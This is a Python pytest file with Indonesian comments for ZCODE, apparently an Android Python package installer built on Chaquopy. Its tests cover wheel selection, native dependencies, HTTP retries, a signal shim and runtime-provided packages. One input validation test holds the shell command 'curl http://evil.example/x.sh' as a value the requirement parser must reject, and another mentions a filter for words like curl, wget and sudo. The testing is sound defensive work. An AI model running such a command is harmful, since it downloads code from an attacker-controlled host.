    HARUS bisa dibaca importlib.metadata & pkg_resources (entry-points).

    Ini mencegah regresi: paket yang bergantung pkg_resources/entry-points
    tidak boleh gagal karena layout yang berbeda dari site-packages biasa.
    """

    def _buat_layout(self, tmp_path):
        pkg = tmp_path / "requests" / "2.32.3"
        pkg.mkdir(parents=True)
        (pkg / "requests").mkdir()
        (pkg / "requests" / "__init__.py").write_text("__version__='2.32.3'\n")
        di = pkg / "requests-2.32.3.dist-info"
        di.mkdir()
        (di / "METADATA").write_text(
            "Metadata-Version: 2.1\nName: requests\nVersion: 2.32.3\n")
        (di / "top_level.txt").write_text("requests\n")
        (di / "entry_points.txt").write_text(
            "[console_scripts]\nmycmd = requests.cli:main\n")
        (di / "RECORD").write_text("")
        return str(pkg)

    def test_importlib_metadata_menemukan_dist(self, tmp_path):
        # Paket unik supaya tidak tercemar versi host. Jalur nyata:
        # envpaths.activate() (seperti runner) lalu importlib.metadata.
        nama = "zcode-testpkg"
        versi = "1.0.0"
        pkg = tmp_path / "python-env" / "site-packages" / nama / versi
        pkg.mkdir(parents=True)
        (pkg / "zcode_testpkg").mkdir()
        (pkg / "zcode_testpkg" / "__init__.py").write_text("__version__='1.0.0'\n")
        di = pkg / ("%s-%s.dist-info" % (nama, versi))
        di.mkdir()
        (di / "METADATA").write_text(
            "Metadata-Version: 2.1\nName: zcode-testpkg\nVersion: 1.0.0\n")
        (di / "top_level.txt").write_text("zcode_testpkg\n")
        (di / "entry_points.txt").write_text(
            "[console_scripts]\nzcmd = zcode_testpkg:main\n")
        (di / "RECORD").write_text("")
        state = tmp_path / "python-env" / "state"
        state.mkdir(parents=True)
        (state / "installed.json").write_text(json.dumps({
            nama: {"version": versi,
                   "path": "site-packages/%s/%s" % (nama, versi),
                   "installed_at": 1, "source": "pypi"},
        }))
        before = list(sys.path)
        try:
            env_mod.activate(str(tmp_path))
            import importlib.metadata as md
            from packaging.utils import canonicalize_name
            cn = canonicalize_name(nama)
            d = next((x for x in md.distributions()
                      if canonicalize_name(x.metadata["Name"] or "") == cn), None)
            assert d is not None, "distributions() tidak melihat zcode-testpkg"
            assert d.version == versi
            eps = list(d.entry_points)
            assert any(e.name == "zcmd" for e in eps), "entry_points tidak terbaca"
        finally:
            sys.path[:] = before

    # CATATAN (2026-08-13): pkg_resources TIDAK dijadikan guard unit test.
    # API ini deprecated & tidak stabil terhadap dist-info sintetis / lintas
    # versi Python (3.11 vs 3.13) dan setuptools — ia memotong nama ber-dash
    # pada dist-info buatan manual, menghasilkan false-failure yang bukan bug
    # ZCODE. Yang membuktikan layout ZCODE bekerja utk entry-points adalah
    # importlib.metadata (test di atas, API modern Python 3.10+). pkg_resources
    # hanya perlu TERSEDIA di Chaquopy (setuptools dibundle) — dijaga oleh
    # test_chaquopy_meng_bundle_setuptools. Verifikasi penuh paket berbasis
    # pkg_resources tetap via UAT device.

    def test_chaquopy_meng_bundle_setuptools(self):
        # pkg_resources berasal dari setuptools yang WAJIB di-bundle di
        # Chaquopy build.gradle. Tanpa ini, paket yang butuh pkg_resources
        # akan gagal di device walau layout sudah benar.
        import re
        p = ROOT / "app/build.gradle.kts"
        txt = p.read_text()
        assert re.search(r"install\(\"setuptools==[0-9.]+\"\)", txt), (
            "setuptools harus di-bundle di chaquopy pip{ install } — "
            "pkg_resources/entry-points bergantung padanya"
        )


# =====================================================================
# BENGKEL v1.0.18 (2026-08-16) — guard Bug Q, S, V (Python side)
# Semua diuji mutasi sebelum commit: hapus fix → test MERAH.
# =====================================================================

class TestBengkelBugQ:
    """Bug Q: murmurhash/cymem/preshed butuh chaquopy-libcxx SEBELUM smoke
    instal-pertama (bukti device: mrmr.so gagal dlopen saat cache kosong,
    percobaan kedua sukses karena cache — pola persis Bug P/cffi)."""

    def test_native_host_deps_libcxx_trio(self):
        for name in ("murmurhash", "cymem", "preshed"):
            deps = resolve_mod.host_deps_for(name) if hasattr(resolve_mod, "host_deps_for") \
                else resolve_mod.NATIVE_HOST_DEPS.get(name, [])
            assert "chaquopy-libcxx" in deps, (
                f"{name} harus memetakan chaquopy-libcxx di NATIVE_HOST_DEPS "
                "(Bug Q: gagal instal-pertama libc++_shared.so not found)"
            )


class TestBengkelBugS:
    """Bug S: pre-release hanya boleh menang bila TIDAK ada stable (PEP 440 /
    perilaku pip). Bukti device: apscheduler 4.0.0a6, isort 9.0.0b2,
    watchfiles 0.0.0a1 (placeholder kosong) terpilih padahal stable ada."""

    def test_best_wheel_tolak_prerelease_bila_ada_stable(self):
        cands = [
            {"filename": "apscheduler-3.11.2-py3-none-any.whl", "url": "u1"},
            {"filename": "apscheduler-4.0.0a6-py3-none-any.whl", "url": "u2"},
        ]
        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
        assert best["filename"].startswith("apscheduler-3.11.2"), (
            "stable 3.11.2 harus menang atas pre-release 4.0.0a6"
        )

    def test_best_wheel_terima_prerelease_bila_tak_ada_stable(self):
        cands = [
            {"filename": "fookit-1.0.0rc1-py3-none-any.whl", "url": "u1"},
        ]
        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
        assert best is not None and best["filename"].startswith("fookit-1.0.0rc1"), (
            "bila hanya pre-release yang tersedia, ia tetap boleh dipilih"
        )

    def test_best_wheel_stable_tetap_pilih_terbaru(self):
        # filter pre-release tidak boleh merusak urutan versi stable (BUG D)
        cands = [
            {"filename": "bar-1.9-py3-none-any.whl", "url": "u1"},
            {"filename": "bar-1.10-py3-none-any.whl", "url": "u2"},
            {"filename": "bar-2.0.0b1-py3-none-any.whl", "url": "u3"},
        ]
        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
        assert best["filename"].startswith("bar-1.10"), (
            "stable terbaru (1.10) harus menang; beta 2.0.0b1 diabaikan"
        )


class TestBengkelBugV:
    """Bug V: NATIVE_LOAD tidak boleh menggagalkan paket yang import-nya
    SUKSES hanya karena tidak ada .so di staging. Bukti device: coverage
    7.15.4 (wheel py3-none-any murni Python) & pyzbar 0.1.8 dirollback
    padahal sehat. Hakim = IMPORT; ketiadaan .so = catatan, bukan vonis."""

    def test_native_load_lolos_tanpa_so_bila_import_ok(self, tmp_path):
        staging = tmp_path / "stage"
        pkg = staging / "cover_fake"
        pkg.mkdir(parents=True)
        (pkg / "__init__.py").write_text("x = 1\n")
        ok, results, native = smoke_mod.run_smoke(
            "cover_fake", str(staging),
            [{"name": "native-load", "type": "NATIVE_LOAD", "target": "cover_fake"}],
        )
        assert ok, (
            "NATIVE_LOAD harus lolos bila import sukses walau 0 .so "
            f"(Bug V); results={results}"
        )

    def test_native_load_tetap_gagal_bila_import_gagal(self, tmp_path):
        staging = tmp_path / "stage2"
        staging.mkdir()
        ok, results, native = smoke_mod.run_smoke(
            "modul_yang_tidak_ada_xyz", str(staging),
            [{"name": "native-load", "type": "NATIVE_LOAD",
              "target": "modul_yang_tidak_ada_xyz"}],
        )
        assert not ok, "import gagal harus tetap menggagalkan NATIVE_LOAD"


class TestBengkelBugW:
    """Bug W: nama paket sah yang mengandung substring kata terlarang
    (pycurl, wget-like) tidak boleh ditolak. Bukti device: 37x penolakan
    'pola yang dilarang' untuk input polos `pycurl`."""

    def test_pycurl_diterima(self):
        r = req_mod.parse_requirement("pycurl")
        assert r["canonical_name"] == "pycurl"

    def test_nama_mengandung_kata_perintah_diterima(self):
        # 'sudoku' mengandung 'sudo'; 'rmsd-kit' mengandung 'rm'
        assert req_mod.parse_requirement("sudoku")["canonical_name"] == "sudoku"

    def test_perintah_shell_tetap_ditolak(self):
        import pytest as _pt
        with _pt.raises(req_mod.RequirementError):
            req_mod.parse_requirement("curl http://evil.example/x.sh")


class TestBengkelMiniV1018:
    """Bengkel-mini penutup v1.0.18 (2026-08-17): panen UAT log 873 baris
    + ekspedisi harta karun katalog. Semua bukti: breadcrumb device
    2026-08-17 + docs/mass-test-armv7-2026-08-16.jsonl + bedah METADATA
    wheel toko Chaquopy."""

    def test_native_host_deps_kelas_bug_q_baru(self):
        # pycurl gagal device "libcurl.so not found"; lameenc/pyproj gagal
        # mass-test "libmp3lame.so/libproj.so not found". METADATA wheel
        # Chaquopy menyebut host-dep ini tapi baru terbaca setelah wheel
        # masuk cache (celah instal-pertama, kelas Bug Q).
        expected = {
            "pycurl": ["chaquopy-curl-openssl-3"],
            "lameenc": ["chaquopy-lame"],
            "pyproj": ["chaquopy-proj-openssl-3"],
            # rantai dalam (bionic311 2026-08-17: pyproj gagal dlopen
            # libtiff.so lalu libjpeg_chaquopy.so sebelum rantai lengkap)
            "chaquopy-proj-openssl-3": [
                "chaquopy-libcxx", "chaquopy-curl-openssl-3", "chaquopy-libtiff",
            ],
            "chaquopy-libtiff": ["chaquopy-libjpeg", "chaquopy-libcxx"],
        }
        for name, want in expected.items():
            deps = resolve_mod.NATIVE_HOST_DEPS.get(name, [])
            for dep in want:
                assert dep in deps, (
                    f"{name} harus memetakan {dep} di NATIVE_HOST_DEPS "
                    "(kelas Bug Q: host-dep tak tertarik saat instal pertama)"
                )

    def test_hidden_dep_matplotlib_inline(self):
        # Bukti device dua arah (UAT maraton 2026-08-16): ipython gagal saat
        # matplotlib belum aktif, sukses setelah matplotlib terpasang.
        # METADATA matplotlib-inline TIDAK menyebut matplotlib.
        deps = resolve_mod.NATIVE_HOST_DEPS.get("matplotlib-inline", [])
        assert "matplotlib" in deps, (
            "matplotlib-inline harus menarik matplotlib (hidden-dep, "
            "bukti device dua arah ipython)"
        )

    def test_http_404_emit_target_not_found_tanpa_detail(self, monkeypatch):
        # Keputusan user 2026-08-17: 404 probe sumber = alur normal, label
        # `target_not_found` TANPA detail; jangan lagi "http_fail HTTPError
        # HTTP 404" palsu (±90 baris per sesi UAT menutupi error nyata).
        from urllib.error import HTTPError

        def fake_urlopen(req, timeout):
            raise HTTPError(req.full_url, 404, "not found", {}, None)

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        bridge = _FakeResolveBridge()
        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
        try:
            with pytest.raises(resolve_mod.ResolveError):
                resolve_mod._http_get("https://chaquo.com/pypi-13.1/tidak-ada/")
        finally:
            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
            resolve_mod._CURRENT_BRIDGE.reset(token)
        stages = [e["stage"] for e in bridge.events]
        assert "target_not_found" in stages, (
            f"404 harus memancarkan target_not_found, bukan http_fail; stages={stages}"
        )
        assert "http_fail" not in stages, (
            "404 tidak boleh lagi dicatat sebagai http_fail (label palsu)"
        )
        ev = next(e for e in bridge.events if e["stage"] == "target_not_found")
        assert ev["detail"] == "", "target_not_found tanpa detail (keputusan user)"

    def test_error_nyata_tetap_http_fail(self, monkeypatch):
        # Relabel 404 TIDAK boleh menelan kegagalan sungguhan: kelas
        # non-retryable yang bukan 404 (mis. sertifikat) wajib tetap
        # http_fail supaya wifi kedip/MITM tetap kelihatan di Diagnostics.
        import ssl

        def fake_urlopen(req, timeout):
            raise ssl.SSLCertVerificationError("cert salah")

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        bridge = _FakeResolveBridge()
        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
        try:
            with pytest.raises(resolve_mod.ResolveError):
                resolve_mod._http_get("https://pypi.org/pypi/demo/json")
        finally:
            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
            resolve_mod._CURRENT_BRIDGE.reset(token)
        stages = [e["stage"] for e in bridge.events]
        assert "http_fail" in stages, (
            f"kegagalan nyata (bukan 404) wajib tetap http_fail; stages={stages}"
        )
        assert "target_not_found" not in stages

    def test_retry_budget_tiga_attempt_untuk_jaringan_kedip(self, monkeypatch):
        # Bukti UAT 2026-08-16: yt-dlp gagal URLError attempt 2/2 lalu sukses
        # manual — jaringan 4G user kedip sesaat. Budget kini 3.
        import socket
        calls = []

        def fake_urlopen(req, timeout):
            calls.append(timeout)
            if len(calls) <= 2:
                raise socket.timeout("kedip")
            return _FakeHttpResponse(b"pulih-attempt-3")

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"pulih-attempt-3"
        assert len(calls) == 3, (
            "dua timeout beruntun harus masih pulih di attempt ke-3 "
            f"(_MAX_HTTP_ATTEMPTS=3); calls={len(calls)}"
        )

    def test_incomplete_read_diretry_bukan_langsung_gagal(self, monkeypatch):
        import http.client
        calls = []

        def fake_urlopen(req, timeout):
            calls.append(timeout)
            if len(calls) == 1:
                raise http.client.IncompleteRead(b"setengah", 20)
            return _FakeHttpResponse(b"metadata-utuh")

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"metadata-utuh"
        assert len(calls) == 2, "IncompleteRead adalah gangguan transport sementara; wajib retry"

    def test_404_memiliki_kode_source_not_found(self, monkeypatch):
        from urllib.error import HTTPError

        monkeypatch.setattr(
            resolve_mod.urllib.request, "urlopen",
            lambda req, timeout: (_ for _ in ()).throw(
                HTTPError(req.full_url, 404, "not found", {}, None)
            ),
        )
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        with pytest.raises(resolve_mod.ResolveError) as exc:
            resolve_mod._http_get("https://chaquo.com/pypi-13.1/demo/")
        assert exc.value.code == "SOURCE_NOT_FOUND"

    def test_dua_repository_gagal_tetap_network_bukan_unavailable(self, monkeypatch):
        def network_fail(*_args, **_kwargs):
            raise resolve_mod.ResolveError(
                "NETWORK", "metadata", "repository belum berhasil dibaca", "uji transport"
            )

        monkeypatch.setattr(resolve_mod, "fetch_pypi_metadata", network_fail)
        monkeypatch.setattr(resolve_mod, "fetch_chaquopy_wheels", network_fail)
        with pytest.raises(resolve_mod.ResolveError) as exc:
            resolve_mod._resolve_unlocked(
                "demo", supported_tags=[Tag("py3", "none", "any")]
            )
        assert exc.value.code == "NETWORK", (
            "kegagalan transport tidak boleh berubah menjadi PACKAGE_NOT_AVAILABLE"
        )

    def test_manifest_pin_mypy_stable_pra_librt(self):
        # mypy>=1.19 menarik librt (C-ext mypyc, tak ada wheel ARMv7 —
        # https://mypy.readthedocs.io/en/stable/changelog.html). 1.18.2 =
        # wheel py3-none-any murni + deps pure. Pola persis pin openai.
        manifest = json.load(open(os.path.join(
            ROOT, "app/src/main/assets/package_catalog/tested-manifest.json")))
        assert "mypy" in manifest, "mypy harus dipin di tested-manifest"
        vers = manifest["mypy"]
        assert all(v.startswith("1.") for v in vers), (
            f"pin mypy harus < 1.19 (librt tak punya wheel ARMv7); dapat {vers}"
        )


class TestSignalShim:
    """Shim signal.signal (2026-08-17): kode Python ZCODE selalu di background
    thread Android; paket yang memasang signal handler saat import (bukti
    device: pycurl via modul bonus `curl`) mati ValueError "main thread".
    Desain catch-based (rpy2 #769 / CPython 38904): thread-check bisa bohong
    di runtime embedded, percobaan nyata tidak."""

    def _fresh_shim(self):
        import importlib
        from package_runtime import signalshim
        importlib.reload(signalshim)  # reset _ORIGINAL_SIGNAL & riwayat
        return signalshim

    def test_install_idempoten(self):
        import signal as sigmod
        asli = sigmod.signal
        shim = self._fresh_shim()
        try:
            shim.install()
            pertama = sigmod.signal
            shim.install()
            assert sigmod.signal is pertama, "install() kedua tidak boleh melapis ganda"
            assert pertama is not asli
        finally:
            sigmod.signal = asli

    def test_background_thread_tidak_meledak_dan_tercatat(self):
        import signal as sigmod
        import threading
        asli = sigmod.signal
        shim = self._fresh_shim()
        try:
            shim.install()
            res = {}

            def worker():
                try:
                    # persis pola curl/__init__.py di wheel pycurl
                    sigmod.signal(sigmod.SIGPIPE, sigmod.SIG_IGN)
                    res["ok"] = True
                except ValueError as e:
                    res["err"] = str(e)

            t = threading.Thread(target=worker)
            t.start(); t.join()
            assert res.get("ok"), (
                "signal.signal dari background thread harus di-skip anggun, "
                f"bukan meledak; res={res}"
            )
            assert "SIGPIPE" in shim.skipped_registrations, (
                "skip harus tercatat jujur di skipped_registrations"
            )
        finally:
            sigmod.signal = asli

    def test_valueerror_lain_tidak_ditelan(self):
        # Uji mutasi putaran 1 membongkar guard lama sebagai PALSU: memakai
        # signal number tak valid, jalur skip pun ikut melempar ValueError
        # (dari getsignal), jadi filter "main thread" yang dihapus tetap
        # lolos. Versi ini mengontrol error-nya sendiri: ValueError non-main-
        # thread WAJIB keluar utuh TANPA tercatat sebagai skip.
        import signal as sigmod
        asli = sigmod.signal
        shim = self._fresh_shim()
        try:
            shim.install()

            def asli_palsu(signalnum, handler):
                raise ValueError("error sungguhan yang bukan soal thread")

            shim._ORIGINAL_SIGNAL = asli_palsu
            sigmod.signal.__zcode_original__ = asli_palsu
            with pytest.raises(ValueError, match="bukan soal thread"):
                sigmod.signal(sigmod.SIGPIPE, sigmod.SIG_IGN)
            assert not shim.skipped_registrations, (
                "ValueError non-main-thread tidak boleh tercatat sebagai skip"
            )
        finally:
            sigmod.signal = asli

    def test_gerbang_terpasang_di_smoke_dan_runner(self):
        src_smoke = open(os.path.join(
            ROOT, "app/src/main/python/package_runtime/smoke.py")).read()
        src_runner = open(os.path.join(
            ROOT, "app/src/main/python/zcode_runner.py")).read()
        for nama, src in (("smoke.py", src_smoke), ("zcode_runner.py", src_runner)):
            assert "signalshim" in src and "install()" in src, (
                f"{nama} harus memasang signalshim.install() — dua gerbang "
                "eksekusi (smoke test & script user) sama-sama background thread"
            )

    def test_trace_hint_menyebut_pelaku(self):
        # Lapis 1: pesan error smoke harus membawa jejak file:baris pemanggil.
        err = None
        try:
            import tempfile, textwrap, importlib.util
            with tempfile.TemporaryDirectory() as d:
                pelaku = os.path.join(d, "pelaku_signal.py")
                open(pelaku, "w").write(textwrap.dedent("""
                    def ledak():
                        raise ValueError("simulasi dari modul pelaku")
                """))
                spec = importlib.util.spec_from_file_location("pelaku_signal", pelaku)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                ok, err = smoke_mod._run_with_timeout(mod.ledak, 5.0)
                assert not ok
        except AssertionError:
            raise
        assert err and "jejak:" in err and "pelaku_signal.py" in err, (
            f"pesan error harus menyebut file pelaku, dapat: {err}"
        )


class TestProvidedPackages:
    """PROVIDED-PACKAGES v1.0.19: setuptools/wheel/pip/packaging dibawa APK
    (build.gradle.kts pip{}). Membelanjakannya dari PyPI = kelas shadowing
    stdlib (setuptools 84 AssertionError distutils; zope-interface korban —
    device 2026-08-17 01:37). Requirement terhadapnya = terpenuhi runtime;
    specifier yang menolak versi beku = vonis jujur."""

    def test_peta_sinkron_dengan_build_gradle(self):
        # Guard dua sisi: peta resolver WAJIB sama dgn pip{} di build.gradle.
        # Drift = provided palsu (resolver bilang ada versi X, APK bawa Y).
        gradle = open(os.path.join(ROOT, "app/build.gradle.kts")).read()
        for name, ver in resolve_mod.RUNTIME_PROVIDED.items():
            assert 'install("%s==%s")' % (name, ver) in gradle, (
                f"RUNTIME_PROVIDED[{name}]={ver} tidak cocok dgn "
                "build.gradle.kts pip{} — sinkronkan dua-duanya"
            )

    def test_deps_provided_terpenuhi_tanpa_download(self, monkeypatch):
        # zope-interface case: deps 'setuptools' TIDAK boleh memicu network.
        called = []
        monkeypatch.setattr(resolve_mod, "_http_get",
                            lambda url: called.append(url) or (_ for _ in ()).throw(
                                AssertionError("network tak boleh disentuh")))
        out = resolve_mod._resolve_unlocked("setuptools") \
            if hasattr(resolve_mod, "_resolve_unlocked") else None
        if out is None:
            import json as _json
            out = _json.loads(resolve_mod.resolve_json("setuptools"))
        assert out["packages"] == []
        hits = out.get("stdlib") or []
        assert hits and "disediakan runtime ZCODE v68.2.2" in hits[0]["reason"], (
            f"root provided harus pulang via kontrak stdlib-info; out={out}"
        )
        assert not called, "resolve paket provided tidak boleh menyentuh network"

    def test_specifier_menolak_versi_beku_vonis_jujur(self, monkeypatch):
        monkeypatch.setattr(resolve_mod, "_http_get",
                            lambda url: (_ for _ in ()).throw(
                                AssertionError("network tak boleh disentuh")))
        import json as _json
        out = _json.loads(resolve_mod.resolve_json("setuptools>=80"))
        assert out["packages"] == []
        un = out.get("unavailable") or []
        assert un and "v68.2.2" in un[0]["reason"] and "tidak terpenuhi" in un[0]["reason"], (
            f"specifier >=80 harus vonis jujur, bukan pura-pura terpenuhi; out={out}"
        )

    def test_specifier_cocok_versi_beku_terpenuhi(self, monkeypatch):
        monkeypatch.setattr(resolve_mod, "_http_get",
                            lambda url: (_ for _ in ()).throw(
                                AssertionError("network tak boleh disentuh")))
        import json as _json
        out = _json.loads(resolve_mod.resolve_json("packaging>=20"))
        hits = out.get("stdlib") or []
        assert hits and "v24.1" in hits[0]["reason"], (
            f"packaging>=20 terpenuhi oleh 24.1 beku; out={out}"
        )

    def test_paket_biasa_tidak_kena_provided(self):
        assert resolve_mod.runtime_provided_version("requests") is None
        assert resolve_mod.runtime_provided_version("numpy") is None
        assert resolve_mod.runtime_provided_version("setuptools") == "68.2.2"
